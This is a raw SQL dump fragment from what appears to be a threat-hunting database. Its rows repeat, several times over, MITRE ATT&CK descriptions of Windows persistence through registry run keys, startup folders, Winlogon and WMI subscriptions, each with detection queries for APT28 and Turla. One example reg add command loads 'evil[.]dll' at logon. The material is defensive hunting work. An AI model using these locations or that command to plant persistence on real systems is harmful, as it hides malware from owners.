HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pr>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\nAPT28:\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>'),(329,354,'relation','copied_to',NULL,'170'),(330,355,'relation','copied_from',NULL,'169'),(331,356,'attr','description','(003)Turla has used WMI event filters and consumers to establish persistence. \r\n(013)Turla has used PowerShell profiles to maintain persistence on an infected machine.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (19 OR 20 OR 21)  AND Channel : *sysmon* AND NOT (Whitelist)\r\n\r\n*profile.ps1 can have additional commands for execution of persistence\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>','Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer\'s uptime.\r\n\r\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\r\n\r\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (19 OR 20 OR 21)  AND Channel : *sysmon* AND NOT (Whitelist)\r\n\r\n*profile.ps1 can have additional commands for execution of persistence\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>'),(332,357,'attr','parent_id','131','5'),(333,358,'attr','description','dversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pr>\r\nThe following run keys are created by default on Windows systems:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pr>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\nAPT28:\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>','adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pr>\r\nThe following run keys are created by default on Windows systems:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pr>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\nAPT28:\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>'),(334,359,'attr','description','adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pr>\r\nThe following run keys are created by default on Windows systems:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pr>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\n    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\nAPT28:\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>','dversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pre>\r\nThe following run keys are created by default on Windows systems:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pre>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\n<pre>\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n</pre>\r\n\r\n<pre>\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n</pre>\r\n\r\n<pre>\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n</pre>\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\n\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>'),(335,359,'attr','parent_id','5','131'),(336,360,'attr','description','A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence. Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion]Winlogon.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/004/\r\n</pre>','Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. [1]\r\n\r\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: [1]\r\n\r\n    Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\r\n    Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\r\n    Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\r\n\r\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/004/\r\n</pre>'),(337,361,'attr','description','dversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pre>\r\nThe following run keys are created by default on Windows systems:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n</pre>\r\n\r\nRun keys may exist under multiple hives.[2][3] The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. [4] For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" [5]\r\n\r\n<pre>\r\nThe following Registry keys can be used to set startup folder items for persistence:\r\n\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\r\n</pre>\r\n\r\n<pre>\r\nThe following Registry keys can control automatic startup of services during boot:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n</pre>\r\n\r\n<pre>\r\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\r\n\r\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n</pre>\r\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell subkeys can automatically launch programs.\r\n\r\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run when any user logs on.\r\n\r\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\r\n\r\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.*+Hunter Notes:+*\r\n<pre>\r\n\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nEventID : (1 